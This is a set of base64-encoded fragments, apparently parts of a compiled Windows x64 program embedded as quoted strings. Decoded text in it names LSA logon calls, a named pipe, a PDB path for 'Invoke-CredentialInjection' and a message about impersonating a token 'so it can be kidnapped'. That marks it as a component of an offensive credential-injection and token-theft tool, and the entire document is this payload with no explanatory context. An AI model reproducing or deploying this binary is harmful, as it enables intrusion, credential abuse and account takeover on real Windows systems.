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BvJI8+L+YlMJCB0HEiLBcT2AABIhcB0EEyLxovTSYvO/9CL+IlEJCCLx+sCM8BIi5wkiAAAAEiDxFBBXl9ew8zMzMzMzGZmDx+EAAAAAABIi8FI99lIqQcAAAB0D2aQihBI/8CE0nRfqAd180m4//7+/v7+/n5JuwABAQEBAQGBSIsQTYvISIPACEwDykj30kkz0Ukj03ToSItQ+ITSdFGE9nRHSMHqEITSdDmE9nQvSMHqEITSdCGE9nQXweoQhNJ0CoT2dblIjUQB/8NIjUQB/sNIjUQB/cN','AAAAAHMAZQAtAEYASQAAAAAAAABxAHUAegAtAFAARQAAAAAAYQByAC0ATABZAAAAAAAAAHoAaAAtAFMARwAAAAAAAABkAGUALQBMAFUAAAAAAAAAZQBuAC0AQwBBAAAAAAAAAGUAcwAtAEcAVAAAAAAAAABmAHIALQBDAEgAAAAAAAAAaAByAC0AQgBBAAAAAAAAAHMAbQBqAC0ATgBPAAAAAABhAHIALQBEAFoAAAAAAAAAegBoAC0ATQBPAAAAAAAAAGQAZQAtAEwASQAAAAAAAABlAG4ALQBOAFoAAAAAAAAAZQBzAC0AQwBSAAAAAAAAAGYAcgAtAEwAVQAAAAAAAABiAHMALQBCAEEALQBMAGEAdABuAAAAAABzAG0AagAtAFMARQAAAAAAYQByAC0ATQBBAAAAAAAAAGUAbgAtAEkARQAAAAAAAABlAHMALQBQAEEAAAAAAAAAZgByAC0ATQBDAAAAAAAAAHMAcgAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBhAC0ATgBPAAAAAABhAHIALQBUAE4AAAAAAAAAZQBuAC0AWgBBAAAAAAAAAGUAcwAtAEQATwAAAAAAAABzAHIALQBCAEEALQBDAHkAcgBsAAAAAABzAG0AYQAtAFMARQAAAAAAYQByAC0ATwBNAAAAAAAAAGUAbgAtAEoATQAAAAAAAABlAHMALQBWAEUAAAAAAAAAcwBtAHMALQBGAEkAAAAAAGEAcgAtAFkARQAAAAAAAABlAG4ALQBDAEIAAAAAAAAAZQBzAC0AQwBPAAAAAAAAAHMAbQBuAC0ARgBJAAAAAABhAHIALQBTAFkAAAAAAAAAZQBuAC0AQgBaAAAAAAAAAG','SIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlae3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn8AMSNTTkFOAAAxI0lORAAAADEjSU5GAAAAMSNRTkFOAABDAE8ATgBPAFUAVAAkAAAAQQAAABcAAABnZW5lcmljAHVua25vd24gZXJyb3IAAABpb3N0cmVhbQAAAAAAAAAAaW9zdHJlYW0gc3RyZWFtIGVycm9yAAAAc3lzdGVtAABzdHJpbmcgdG9vIGxvbmcAaW52YWxpZCBzdHJpbmcgcG9zaXRpb24AXABcAC4AXABwAGkAcABlAFwAcwBxAHMAdgBjAAAAAABFcnJvciBjYWxsaW5nIExzYUNvbm5lY3RVbnRydXN0ZWQuIEVycm9yIGNvZGU6IABoTFNBIChMU0EgaGFuZGxlKSBpcyBOVUxMLCB0aGlzIHNob3VsZG4ndCBldmVyIGhhcHBlbi4AAE1JQ1JPU09GVF9BVVRIRU5USUNBVElPTl9QQUNLQUdFX1YxXzAAAABLZXJiZXJvcwAAAAAAAAAAUmVjZWl2ZWQgYW4gaW52YWxpZCBhdXRoIHBhY2thZ2UgZnJvbSB0aGUgbmFtZWQgcGlwZQAAAABDYWxsIHRvIExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZSBmYWlsZWQuIEVycm9yIGNvZGU6IAAAAAAAQ2FsbCB0byBPcGVuUHJvY2Vzc1Rva2VuIGZhaWxlZC4gRXJyb3Jjb2RlOiAAAAAAQ2FsbCB0byBHZXRUb2tlbkluZm9yb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','AIABAAAASIgBgAEAAADkJACAAQAAAAw7AIABAAAAYmFkIGFsbG9jYXRpb24AAMiIAYABAAAAICUAgAEAAAAMOwCAAQAAAEiJAYABAAAAICUAgAEAAAAMOwCAAQAAANCJAYABAAAAICUAgAEAAAAMOwCAAQAAAF9oeXBvdAAAWIoBgAEAAAB0LQCAAQAAAAAAAAAAAAAAY3Nt4AEAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAgBZMZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkAAIABAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAIAWTGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8DgAgAEAAADQigGAAQAAAEw6AIABAAAADDsAgAEAAABVbmtub3duIGV4Y2VwdGlvbgAAAAAAAAAQygGAAQAAALDKAYABAAAAbQBzAGMAbwByAGUAZQAuAGQAbABsAAAAQ29yRXhpdFByb2Nlc3MAAChudWxsKQAAKABuAHUAbABsACkAAAAAAAYAAAYAAQAAEAADBgAGAhAERUVFBQUFBQU1MABQAAAAACggOFBYBwgANzAwV1AHAAAgIAgAAAAACGBoYGBgYAA','AIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA','9uwmYPYMD2wQ90Fg8RAUiLwUiD4A9Ig8EQSCvITo1EAPBNi8hJwekHdDLrAZAPKQEPKUEQSIHBgAAAAA8pQaAPKUGwSf/JDylBwA8pQdAPKUHgDylB8HXVSYPgf02LyEnB6QR0FA8fhAAAAAAADykBSIPBEEn/yXX0SYPgD3QGQQ8RRAjwSYvDw0m5AQEBAQEBAQFJD6/RTI0N/67//0OLhIEVUQAATAPISQPISYvDQf/hblEAAGtRAAB8UQAAZ1EAAJBRAACFUQAAeVEAAGRRAAClUQAAnVEAAJRRAABvUQAAjFEAAIFRAAB1UQAAYFEAAGZmZg8fhAAAAAAASIlR8YlR+WaJUf2IUf/DSIlR9evySIlR8olR+maJUf7DSIlR84lR+4hR/8NIiVH0iVH8w0iJUfZmiVH+w0iJUfeIUf/DSIlR+MPMzEiJXCQISIlsJBBIiXQkGFdIg+wgSIvyi/noVgMAAEUzyUiL2EiFwA+EiAEAAEiLkKAAAABIi8o5OXQQSI2CwAAAAEiDwRBIO8hy7EiNgs','/4XAdBNEiHUQQIh9EcZFEgC5AgAAAOsY6KCP//+5AQAAAMcAKgAAAECIfRDGRREASItV4MdEJEABAAAATI1NEItCBEiLkjgBAABBuAABAACJRCQ4SI1FIMdEJDADAAAASIlEJCiJTCQgSI1N4OgfDQAAhcAPhE7///+D+AEPtkUgdAkPtk0hweAIC8GAffgAdAtIi03wg6HIAAAA/UyNXCRwSYt7GE2LcyhJi+Ndw8zMgz3hHAEAAHUOjUG/g/gZdwODwSCLwcMz0umO/v//zMxIg+wYRTPATIvJhdJ1SEGD4Q9Ii9EPV8lIg+LwQYvJQYPJ/0HT4WYPbwJmD3TBZg/XwEEjwXUUSIPCEGYPbwJmD3TBZg/XwIXAdOwPvMBIA8LppgAAAIM9s+8AAAIPjZ4AAABMi9EPtsJBg+EPSYPi8IvID1fSweEIC8hmD27BQYvJQYPJ/0HT4fIPcMgAZg9vwmZBD3QCZg9w2QBmD9fIZg9vw2ZBD3QCZg/X0EEj0UEjyXUuD73KZg9vymYPb8NJA8qF0kwPRcFJg8IQZkEPdApmQQ90AmYP18lmD9fQhcl00ovB99gjwf/II9APvcpJA8qF0kwPRcFJi8BIg8QYw/bBD3QZQQ++ATvCTQ9EwUGAOQB040n/wUH2wQ915w+2wmYPbsBmQQ86YwFAcw1MY8FNA8FmQQ86YwFAdLtJg8EQ6+JIiVwkCFdIg+wgSIvZSYtJEEUz0kiF23UY6IqN//+7FgAAAIkY6CaJ//+Lw+mPAAAASIXSdONBi8JFhcBEiBNBD0/A/8BImEg70HcM6FeN//+7IgAAAOvLSI17AcYDMEiLx+saRDgRdAgPvhFI/8HrBbowAAAAiBBI/8BB/8hFhcB/4USIEHgUgDk1fA/rA8YAMEj/yIA4OXT1/gCAOzF1BkH/QQTrF0iLz+gVb///SIvXSIvLTI1AAehGZP//M8BIi1wkMEiDxCBfw8xAU1ZXSIHsgAAAAEiLBd7tAABIM8RIiUQkeEiL8UiL2kiNTCRISYvQSYv56JSL//9IjUQkS